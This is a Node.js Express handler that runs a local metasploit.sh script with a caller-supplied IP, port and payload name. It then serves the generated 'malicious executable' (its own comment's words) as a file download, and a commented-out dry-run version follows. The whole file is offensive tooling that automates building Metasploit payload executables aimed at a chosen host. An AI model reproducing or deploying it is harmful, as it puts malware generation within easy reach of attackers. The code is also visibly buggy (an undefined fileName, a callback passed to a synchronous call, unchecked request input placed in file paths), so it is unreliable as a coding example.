var shell = require("shelljs");
var process = require("process");
const fs = require("fs");

//exname is the name of malicious executable in metasploit.sh
//spayload is the send payload option
var metasploit = async (req, res) => {
  var { ip, port, payload } = req.body;
  let output = "";

  let meta = shell.exec(
    `${process.cwd()}/scripts/metasploit.sh`,
    (error, stdout, stderr) => {
      console.log(stdout);
      console.log(stderr);
      if (error !== 0) {
        res.status(400);
        return res.json({ status: "error", error: stderr });
      } else {
        const filePath = `${process.cwd()}/scripts/${payload}.exe`; // or any file format

        // Check if file specified by the filePath exists
        fs.existsSync(filePath, (exists) => {
          if (exists) {
            // Content-type is very interesting part that guarantee that
            // Web browser will handle response in an appropriate manner.
            res.writeHead(200, {
              "Content-Type": "application/octet-stream",
              "Content-Disposition": "attachment; filename=" + fileName,
            });
            fs.createReadStream(filePath).pipe(res);
            return;
          }
          res.writeHead(400, { "Content-Type": "text/plain" });
          res.end("ERROR File does not exist");
        });
      }
    }
  );
  meta.stdin.write(`${ip} \n`);
  meta.stdin.write(`${port} \n`);
  meta.stdin.write(`${payload} \n`);

  try {
    shell.rm(`${payload}.exe`);
  } catch (err) {
    console.error(err);
  }
};

module.exports = metasploit;

//code for dry run

// var ip = "127.0.0.1";
// var spayload = "n";
// var port = 3000;
// var exname = "abdc";
// shell.rm("-f", `${exname}.exe`);
// if (spayload === "") {
//   spayload = "n";
// }
// var meta = shell.exec(
//   `${process.cwd()}/scripts/metasploit.sh`,
//   (error, stdout, stderr) => {
//     console.log(stdout);
//     console.log(stderr);
//     if (error !== 0) {
//       res.status(400);
//       return res.json({ status: "error", error: stderr });
//     } else {
//       res.status(200);
//       res.json({ status: "ok", output: stdout });
//     }
//   }
// );
// meta.stdin.write(`${ip} \n`);
// meta.stdin.write(`${port} \n`);
// meta.stdin.write(`${exname} \n`);
// meta.stdin.write(`${spayload} \n`);
